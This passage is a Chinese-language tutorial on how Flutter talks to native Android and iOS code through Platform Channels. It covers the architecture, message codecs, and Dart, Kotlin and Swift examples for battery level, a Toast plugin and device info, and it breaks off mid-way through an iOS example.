pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>很多人把Flutter插件开发想得太复杂，其实它的本质就是把Dart语言转换成Java/Swift能识别的语言，再把原生平台的回应翻译回Dart。今天，我们将Flutter与原生平台交互的工作机制彻底搞明白。</p>
</blockquote>
<h3 data-id="heading-1">为什么需要原生交互？</h3>
<p>在正式开始之前，我们先思考一个问题：Flutter作为一个跨平台框架，它的跨平台能力边界在哪里？</p>
<p>实际上，<strong>Flutter的跨平台能力主要体现在UI渲染层</strong>。Dart代码编译后可以在Android和iOS上运行，Flutter引擎负责将Widget树渲染成对应的平台视图。但当我们想要访问平台某些特定功能时，比如：调用系统相机/相册、使用蓝牙或NFC等功能，这些情况下，我们就需要桥接原生代码。</p>
<h3 data-id="heading-2">一、Platform Channel：Flutter与原生交互的桥梁</h3>
<h4 data-id="heading-3">1.1 核心架构</h4>
<p>很多人以为Platform Channel就是一个简单的管道，其实它是<strong>三层协议栈</strong>：<code>Dart层</code>，<code>引擎层</code>，<code>平台层</code>；让我们先通过一张架构图来加深理解Platform Channel的整体结构：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Flutter Dart代码] --&gt;|MethodChannel| B[Flutter Framework层]
    B --&gt;|C++编解码| C[Flutter Engine引擎]
    C --&gt;|平台消息路由| D[Android平台]
    C --&gt;|平台消息路由| E[iOS平台]
    D --&gt;|JNI/Java调用| F[Native Android代码]
    E --&gt;|Objective-C/Swift调用| G[Native iOS代码]
    
    subgraph "Platform Channel通信流"
        direction LR
        H[Dart发起调用] --&gt; I[消息序列化] --&gt; J[通过BinaryMessenger传递] --&gt; K[平台侧反序列化] --&gt; L[执行原生代码] --&gt; M[返回结果序列化] --&gt; N[Dart侧接收结果]
    end
</code></pre>
<p><strong>备注</strong>：</p>
<ul>
<li><strong>MethodChannel</strong>：最常用的通道，用于方法调用</li>
<li><strong>EventChannel</strong>：用于从原生到Dart的事件流</li>
<li><strong>BasicMessageChannel</strong>：用于简单的消息传递，较少使用</li>
<li><strong>BinaryMessenger</strong>：底层消息传递机制，所有Channel都基于它</li>
</ul>
<h4 data-id="heading-4">1.2 交互原理</h4>
<p><strong>具体步骤</strong>：</p>
<ol>
<li><strong>Dart代码</strong>：你把需求用Dart语言写好，MethodChannel会将其转换成二进制数据格式</li>
<li><strong>Engine</strong>：通过Flutter引擎传递到对应平台</li>
<li><strong>Platform</strong>：Android/iOS接收到数据后进行拆解并理解其内容</li>
<li><strong>Native</strong>：Android/iOS端完成需求</li>
<li><strong>返回结果</strong>：反向再来一遍上述流程</li>
</ol>
<p>我们简单画个流程图，方便理解：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant D as Dart代码
    participant C as MethodChannel
    participant B as BinaryMessenger
    participant E as Flutter引擎
    participant P as 平台层(Android/iOS)
    participant N as Native代码
    
    D-&gt;&gt;C: invokeMethod("拍照", 参数)
    Note over C: 步骤1：打包&lt;br/&gt;把方法名+参数编码成二进制
    C-&gt;&gt;B: 发送二进制消息
    B-&gt;&gt;E: 跨边界传输
    Note over E: 步骤2：数据传递&lt;br/&gt;通过JNI/FFI传递
    E-&gt;&gt;P: 分发到对应平台
    P-&gt;&gt;N: 调用原生方法
    Note over N: 步骤3：本地执行&lt;br/&gt;Java/Swift实际处理
    N--&gt;&gt;P: 返回结果
    P--&gt;&gt;E: 编码结果
    E--&gt;&gt;B: 返回二进制
    B--&gt;&gt;C: 接收响应
    Note over C: 步骤4：解析&lt;br/&gt;解码二进制为Dart对象
    C--&gt;&gt;D: Future完成，返回结果
</code></pre>
<p><strong>代码层面的流程</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Dart侧发起调用</span>
Future&lt;<span class="hljs-built_in">String</span>&gt; result = channel.invokeMethod(<span class="hljs-string">'getBatteryLevel'</span>);

<span class="hljs-comment">// 这行代码背后发生了什么？</span>
<span class="hljs-comment">// 1. invokeMethod将方法名和参数序列化为二进制消息</span>
<span class="hljs-comment">// 2. 通过BinaryMessenger.send()发送</span>
<span class="hljs-comment">// 3. 引擎收到消息，路由到对应平台</span>
<span class="hljs-comment">// 4. 平台侧处理消息，执行原生代码</span>
<span class="hljs-comment">// 5. 结果序列化后返回</span>
<span class="hljs-comment">// 6. Dart侧反序列化得到结果</span>
</code></pre>
<h4 data-id="heading-5">1.3 数据编解码</h4>
<p>如何跨语言传递复杂数据？不同编程语言有不同的数据类型系统，如何让Dart的<code>List&lt;Map&lt;String, dynamic&gt;&gt;</code>在Java和Swift中也能被理解？</p>
<p>Flutter使用标准化的消息编解码器：</p>
<ul>
<li><strong>StandardMessageCodec</strong>：默认编解码器，支持基础类型和列表、字典</li>
<li><strong>JSONMessageCodec</strong>：使用JSON格式编码</li>
<li><strong>StringCodec</strong>：只处理字符串</li>
<li><strong>BinaryCodec</strong>：原始二进制数据</li>
</ul>
<p><strong>编码规则表</strong>：</p>

































































<table><thead><tr><th>Dart类型</th><th>Java/Kotlin类型</th><th>Swift/OC类型</th></tr></thead><tbody><tr><td>null</td><td>null</td><td>nil</td></tr><tr><td>bool</td><td>java.lang.Boolean</td><td>NSNumber(numberWithBool:)</td></tr><tr><td>int</td><td>java.lang.Integer</td><td>NSNumber(numberWithInt:)</td></tr><tr><td>double</td><td>java.lang.Double</td><td>NSNumber(numberWithDouble:)</td></tr><tr><td>String</td><td>java.lang.String</td><td>NSString</td></tr><tr><td>Uint8List</td><td>byte[]</td><td>FlutterStandardTypedData typedDataWithBytes:</td></tr><tr><td>Int32List</td><td>int[]</td><td>FlutterStandardTypedData typedDataWithInt32:</td></tr><tr><td>Int64List</td><td>long[]</td><td>FlutterStandardTypedData typedDataWithInt64:</td></tr><tr><td>Float64List</td><td>double[]</td><td>FlutterStandardTypedData typedDataWithFloat64:</td></tr><tr><td>List</td><td>java.util.ArrayList</td><td>NSArray</td></tr><tr><td>Map</td><td>java.util.HashMap</td><td>NSDictionary</td></tr></tbody></table>
<p><strong>主要限制</strong>：</p>
<ul>
<li>不支持自定义类的直接传递</li>
<li>复杂对象需要先转换为Map/List等基本类型组合</li>
<li>大数据量传输需要考虑性能问题</li>
</ul>
<h3 data-id="heading-6">二、与Android原生交互</h3>
<h4 data-id="heading-7">2.1 以获取电池电量为例</h4>
<p>让我们从一个最简单的例子开始，了解完整的通信流程。</p>
<h5 data-id="heading-8">Dart侧代码</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatteryPlugin</span> </span>{
  <span class="hljs-comment">// 1. 创建MethodChannel实例</span>
  <span class="hljs-comment">// 约定好通道名称（必须与原生侧完全一致）</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/battery'</span>);
  
  <span class="hljs-comment">// 2. 公开的Dart方法</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">int</span>&gt; getBatteryLevel() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 3. 调用原生方法</span>
      <span class="hljs-comment">// invokeMethod的第一个参数是方法名(必须与原生侧对应)</span>
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> level = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'getBatteryLevel'</span>);
      <span class="hljs-keyword">return</span> level;
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// 4. 异常处理</span>
      <span class="hljs-built_in">print</span>(<span class="hljs-string">"获取电量失败: <span class="hljs-subst">${e.message}</span>"</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
  }
}

<span class="hljs-comment">// 使用</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      home: Scaffold(
        body: Center(
          child: ElevatedButton(
            child: Text(<span class="hljs-string">'获取电量'</span>),
            onPressed: () <span class="hljs-keyword">async</span> {
              <span class="hljs-comment">// 调用插件方法</span>
              <span class="hljs-built_in">int</span> level = <span class="hljs-keyword">await</span> BatteryPlugin.getBatteryLevel();
              <span class="hljs-keyword">if</span> (level != <span class="hljs-number">-1</span>) {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">'当前电量: <span class="hljs-subst">$level</span>%'</span>);
              }
            },
          ),
        ),
      ),
    );
  }
}
</code></pre>
<h5 data-id="heading-9">Android侧代码（Kotlin）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.myapp

<span class="hljs-keyword">import</span> android.content.Context
<span class="hljs-keyword">import</span> android.content.ContextWrapper
<span class="hljs-keyword">import</span> android.content.Intent
<span class="hljs-keyword">import</span> android.content.IntentFilter
<span class="hljs-keyword">import</span> android.os.BatteryManager
<span class="hljs-keyword">import</span> android.os.Build.VERSION
<span class="hljs-keyword">import</span> android.os.Build.VERSION_CODES
<span class="hljs-keyword">import</span> io.flutter.embedding.android.FlutterActivity
<span class="hljs-keyword">import</span> io.flutter.embedding.engine.FlutterEngine
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">FlutterActivity</span>() {
    <span class="hljs-comment">// 1. 定义通道名称（必须与Dart侧一致）</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CHANNEL = <span class="hljs-string">"com.xxxx/battery"</span>
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">configureFlutterEngine</span><span class="hljs-params">(flutterEngine: <span class="hljs-type">FlutterEngine</span>)</span></span> {
        <span class="hljs-keyword">super</span>.configureFlutterEngine(flutterEngine)
        
        <span class="hljs-comment">// 2. 创建MethodChannel</span>
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL
        ).setMethodCallHandler { call, result -&gt;
            <span class="hljs-comment">// 3. 处理方法调用</span>
            <span class="hljs-keyword">when</span> (call.method) {
                <span class="hljs-string">"getBatteryLevel"</span> -&gt; {
                    <span class="hljs-comment">// 4. 执行实际的原生代码</span>
                    <span class="hljs-keyword">val</span> batteryLevel = getBatteryLevel()
                    
                    <span class="hljs-keyword">if</span> (batteryLevel != -<span class="hljs-number">1</span>) {
                        <span class="hljs-comment">// 5. 返回成功结果</span>
                        result.success(batteryLevel)
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// 6. 返回错误结果</span>
                        result.error(
                            <span class="hljs-string">"UNAVAILABLE"</span>,
                            <span class="hljs-string">"无法获取电量信息"</span>,
                            <span class="hljs-literal">null</span>
                        )
                    }
                }
                <span class="hljs-keyword">else</span> -&gt; {
                    <span class="hljs-comment">// 7. 处理未实现的方法</span>
                    result.notImplemented()
                }
            }
        }
    }
    
    <span class="hljs-comment">// 获取电量的实际实现</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getBatteryLevel</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (VERSION.SDK_INT &gt;= VERSION_CODES.LOLLIPOP) {
            <span class="hljs-keyword">val</span> batteryManager = getSystemService(Context.BATTERY_SERVICE) <span class="hljs-keyword">as</span> BatteryManager
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 旧版本Android的兼容处理</span>
            <span class="hljs-keyword">val</span> intent = ContextWrapper(applicationContext)
                .registerReceiver(<span class="hljs-literal">null</span>, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            <span class="hljs-keyword">val</span> level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -<span class="hljs-number">1</span>) ?: -<span class="hljs-number">1</span>
            <span class="hljs-keyword">val</span> scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -<span class="hljs-number">1</span>) ?: -<span class="hljs-number">1</span>
            
            <span class="hljs-keyword">if</span> (level == -<span class="hljs-number">1</span> || scale == -<span class="hljs-number">1</span>) {
                -<span class="hljs-number">1</span>
            } <span class="hljs-keyword">else</span> {
                (level * <span class="hljs-number">100</span> / scale.toFloat()).toInt()
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-10">2.2 复杂参数传递：从Dart传递数据到Android</h4>
<p>实际开发中，我们经常需要传递复杂参数。看看如何传递一个用户对象：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Dart侧</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; saveUser(User user) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 将User对象转换为Map</span>
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; userMap = {
      <span class="hljs-string">'name'</span>: user.name,
      <span class="hljs-string">'age'</span>: user.age,
      <span class="hljs-string">'email'</span>: user.email,
      <span class="hljs-string">'isVip'</span>: user.isVip,
    };
    
    <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveUser'</span>, userMap);
  } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'保存用户失败: <span class="hljs-subst">${e.message}</span>'</span>);
  }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧（Kotlin）</span>
.setMethodCallHandler { call, result -&gt;
    <span class="hljs-keyword">when</span> (call.method) {
        <span class="hljs-string">"saveUser"</span> -&gt; {
            <span class="hljs-comment">// 获取参数</span>
            <span class="hljs-keyword">val</span> arguments = call.arguments <span class="hljs-keyword">as</span>? Map&lt;*, *&gt;
            
            <span class="hljs-keyword">if</span> (arguments != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">val</span> name = arguments[<span class="hljs-string">"name"</span>] <span class="hljs-keyword">as</span>? String
                <span class="hljs-keyword">val</span> age = arguments[<span class="hljs-string">"age"</span>] <span class="hljs-keyword">as</span>? <span class="hljs-built_in">Int</span>
                <span class="hljs-keyword">val</span> email = arguments[<span class="hljs-string">"email"</span>] <span class="hljs-keyword">as</span>? String
                <span class="hljs-keyword">val</span> isVip = arguments[<span class="hljs-string">"isVip"</span>] <span class="hljs-keyword">as</span>? <span class="hljs-built_in">Boolean</span>
                
                <span class="hljs-comment">// 保存</span>
                <span class="hljs-keyword">val</span> success = saveUserToStorage(name, age, email, isVip)
                
                <span class="hljs-keyword">if</span> (success) {
                    result.success(<span class="hljs-literal">null</span>) 
                } <span class="hljs-keyword">else</span> {
                    result.error(<span class="hljs-string">"SAVE_FAILED"</span>, <span class="hljs-string">"保存用户失败"</span>, <span class="hljs-literal">null</span>)
                }
            } <span class="hljs-keyword">else</span> {
                result.error(<span class="hljs-string">"INVALID_ARGUMENTS"</span>, <span class="hljs-string">"参数格式错误"</span>, <span class="hljs-literal">null</span>)
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-11">2.3 异步操作处理：长时间运行的任务</h4>
<p>有些原生操作可能耗时较长，比如下载文件、处理图像等，我们需要正确处理异步：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧：使用协程处理异步任务</span>
.setMethodCallHandler { call, result -&gt;
    <span class="hljs-keyword">when</span> (call.method) {
        <span class="hljs-string">"processImage"</span> -&gt; {
            <span class="hljs-keyword">val</span> imagePath = call.arguments <span class="hljs-keyword">as</span>? String
            
            <span class="hljs-comment">// 启动协程处理耗时操作</span>
            CoroutineScope(Dispatchers.IO).launch {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">val</span> processedPath = processImageHeavy(imagePath)
                    
                    <span class="hljs-comment">// 切回主线程返回结果</span>
                    withContext(Dispatchers.Main) {
                        result.success(processedPath)
                    }
                } <span class="hljs-keyword">catch</span> (e: Exception) {
                    withContext(Dispatchers.Main) {
                        result.error(<span class="hljs-string">"PROCESS_FAILED"</span>, e.message, <span class="hljs-literal">null</span>)
                    }
                }
            }
            
            <span class="hljs-comment">// 注意：这里没有立即调用result方法，异步操作完成后才调用</span>
        }
    }
}
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Dart侧：添加超时处理</span>
Future&lt;<span class="hljs-built_in">String</span>&gt; processImage(<span class="hljs-built_in">String</span> imagePath) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 设置超时时间</span>
    <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'processImage'</span>, imagePath)
        .timeout(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">10</span>));
    
    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
  } <span class="hljs-keyword">on</span> TimeoutException {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'图片处理超时'</span>);
    <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">'处理超时'</span>);
  } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'图片处理失败: <span class="hljs-subst">${e.message}</span>'</span>);
    <span class="hljs-keyword">throw</span> Exception(e.message);
  }
}
</code></pre>
<h4 data-id="heading-12">2.4 以Toast消息插件为例</h4>
<p>让我们创建一个完整的Android Toast插件：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// flutter_toast.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlutterToast</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/toast'</span>);
  
  <span class="hljs-comment">// 显示短时Toast</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showShort(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'showShortToast'</span>, message);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'显示Toast失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
  
  <span class="hljs-comment">// 显示长时Toast</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showLong(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'showLongToast'</span>, message);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'显示Toast失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
  
  <span class="hljs-comment">// 显示自定义时长Toast</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showCustom(<span class="hljs-built_in">String</span> message, <span class="hljs-built_in">int</span> duration) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'showCustomToast'</span>, {
        <span class="hljs-string">'message'</span>: message,
        <span class="hljs-string">'duration'</span>: duration,
      });
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'显示Toast失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧 - MainActivity.kt</span>
<span class="hljs-keyword">package</span> com.example.myapp

<span class="hljs-keyword">import</span> android.widget.Toast
<span class="hljs-keyword">import</span> io.flutter.embedding.android.FlutterActivity
<span class="hljs-keyword">import</span> io.flutter.embedding.engine.FlutterEngine
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">FlutterActivity</span>() {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CHANNEL = <span class="hljs-string">"com.xxxx/toast"</span>
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">configureFlutterEngine</span><span class="hljs-params">(flutterEngine: <span class="hljs-type">FlutterEngine</span>)</span></span> {
        <span class="hljs-keyword">super</span>.configureFlutterEngine(flutterEngine)
        
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL
        ).setMethodCallHandler { call, result -&gt;
            <span class="hljs-comment">// 主线程执行UI操作</span>
            runOnUiThread {
                <span class="hljs-keyword">when</span> (call.method) {
                    <span class="hljs-string">"showShortToast"</span> -&gt; {
                        <span class="hljs-keyword">val</span> message = call.arguments <span class="hljs-keyword">as</span>? String
                        Toast.makeText(
                            <span class="hljs-keyword">this</span>,
                            message ?: <span class="hljs-string">""</span>,
                            Toast.LENGTH_SHORT
                        ).show()
                        result.success(<span class="hljs-literal">null</span>)
                    }
                    
                    <span class="hljs-string">"showLongToast"</span> -&gt; {
                        <span class="hljs-keyword">val</span> message = call.arguments <span class="hljs-keyword">as</span>? String
                        Toast.makeText(
                            <span class="hljs-keyword">this</span>,
                            message ?: <span class="hljs-string">""</span>,
                            Toast.LENGTH_LONG
                        ).show()
                        result.success(<span class="hljs-literal">null</span>)
                    }
                    
                    <span class="hljs-string">"showCustomToast"</span> -&gt; {
                        <span class="hljs-keyword">val</span> arguments = call.arguments <span class="hljs-keyword">as</span>? Map&lt;*, *&gt;
                        <span class="hljs-keyword">val</span> message = arguments?.<span class="hljs-keyword">get</span>(<span class="hljs-string">"message"</span>) <span class="hljs-keyword">as</span>? String
                        <span class="hljs-keyword">val</span> duration = arguments?.<span class="hljs-keyword">get</span>(<span class="hljs-string">"duration"</span>) <span class="hljs-keyword">as</span>? <span class="hljs-built_in">Int</span> ?: <span class="hljs-number">2000</span>
                        
                        <span class="hljs-comment">// 自定义Toast</span>
                        <span class="hljs-keyword">val</span> toast = Toast.makeText(<span class="hljs-keyword">this</span>, message ?: <span class="hljs-string">""</span>, Toast.LENGTH_SHORT)
                        
                        <span class="hljs-comment">// Android的Toast不支持直接设置毫秒数，这是一个简单的案例明白如何用即可</span>
                        <span class="hljs-comment">// 实际项目中需要自定义View</span>
                        toast.duration = <span class="hljs-keyword">if</span> (duration &gt; <span class="hljs-number">2000</span>) Toast.LENGTH_LONG <span class="hljs-keyword">else</span> Toast.LENGTH_SHORT
                        toast.show()
                        
                        result.success(<span class="hljs-literal">null</span>)
                    }
                    
                    <span class="hljs-keyword">else</span> -&gt; result.notImplemented()
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-13">三、与iOS原生交互</h3>
<h4 data-id="heading-14">3.1 iOS与Android的差异</h4>
<p>在开始iOS开发前，需要了解一些iOS与Android两端的差异：</p>






























<table><thead><tr><th>维度</th><th>Android (Kotlin/Java)</th><th>iOS (Swift/OC)</th></tr></thead><tbody><tr><td>项目结构</td><td>MainActivity.kt</td><td>AppDelegate.swift</td></tr><tr><td>管道注册</td><td>configureFlutterEngine</td><td>application didFinishLaunchingWithOptions</td></tr><tr><td>内存管理</td><td>JVM自动垃圾回收</td><td>ARC自动引用计数</td></tr><tr><td>平台特性</td><td>Context对象</td><td>UIViewController</td></tr></tbody></table>
<h4 data-id="heading-15">3.2 以获取iOS设备信息为例</h4>
<h5 data-id="heading-16">iOS侧代码（Swift）</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// AppDelegate.swift</span>
<span class="hljs-keyword">import</span> UIKit
<span class="hljs-keyword">import</span> Flutter

<span class="hljs-keyword">@UIApplicationMain</span>
<span class="hljs-keyword">@objc</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppDelegate</span>: <span class="hljs-title class_">FlutterAppDelegate</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">application</span>(
        <span class="hljs-keyword">_</span> <span class="hljs-params">application</span>: <span class="hljs-type">UIApplication</span>,
        <span class="hljs-params">didFinishLaunchingWithOptions</span> <span class="hljs-params">launchOptions</span>: [<span class="hljs-type">UIApplication</span>.<span class="hljs-params">LaunchOptionsKey</span>: <span class="hljs-keyword">Any</span>]<span class="hljs-operator">?</span>
    ) -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// 1. 获取FlutterViewController</span>
        <span class="hljs-keyword">let</span> controller: <span class="hljs-type">FlutterViewController</span> <span class="hljs-operator">=</span> window<span class="hljs-operator">?</span>.rootViewController <span class="hljs-keyword">as!</span> <span class="hljs-type">FlutterViewController</span>
        
        <span class="hljs-comment">// 2. 创建MethodChannel</span>
        <span class="hljs-keyword">let</span> batteryChannel <span class="hljs-operator">=</span> <span class="hljs-type">FlutterMethodChannel</span>(
            name: <span class="hljs-string">"com.xxxx/battery"</span>,
            binaryMessenger: controller.binaryMessenger
        )
        
        <span class="hljs-comment">// 3. 设置方法处理器</span>
        batteryChannel.setMethodCallHandler { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] (call: <span class="hljs-type">FlutterMethodCall</span>, result: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterResult</span>) <span class="hljs-keyword">in</span>
            <span class="hljs-comment">// 4. 根据方法名分派处理</span>
            <span class="hljs-keyword">if</span> call.method <span class="hljs-operator">==</span> <span class="hljs-string">"getBatteryLevel"</span> {
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.receiveBatteryLevel(result: result)
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> call.method <span class="hljs-operator">==</span> <span class="hljs-string">"getDeviceInfo"</span> {
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.getDeviceInfo(result: result)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 5. 未实现的方法</span>
                result(<span class="hljs-type">FlutterMethodNotImplemented</span>)
            }
        }
        
        <span class="hljs-type">GeneratedPluginRegistrant</span>.register(with: <span class="hljs-keyword">self</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.application(application, didFinishLaunchingWithOptions: launchOptions)
    }
    
    <span class="hljs-comment">// 获取电池电量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">receiveBatteryLevel</span>(<span class="hljs-params">result</span>: <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-comment">// 6. 获取设备对象</span>
        <span class="hljs-keyword">let</span> device <span class="hljs-operator">=</span> <span class="hljs-type">UIDevice</span>.current
        
        <span class="hljs-comment">// 7. 开启电池监控</span>
        device.isBatteryMonitoringEnabled <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// 8. 获取电池状态</span>
        <span class="hljs-keyword">if</span> device.batteryState <span class="hljs-operator">==</span> .unknown {
            <span class="hljs-comment">// 9. 无法获取电量</span>
            result(<span class="hljs-type">FlutterError</span>(
                code: <span class="hljs-string">"UNAVAILABLE"</span>,
                message: <span class="hljs-string">"电池信息不可用"</span>,
                details: <span class="hljs-literal">nil</span>
            ))
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 10. 计算电量百分比</span>
            <span class="hljs-keyword">let</span> batteryLevel <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>(device.batteryLevel <span class="hljs-operator">*</span> <span class="hljs-number">100</span>)
            result(batteryLevel)
        }
    }
    
    <span class="hljs-comment">// 获取设备信息</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">getDeviceInfo</span>(<span class="hljs-params">result</span>: <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-keyword">let</span> device <span class="hljs-operator">=</span> <span class="hljs-type">UIDevice</span>.current
        
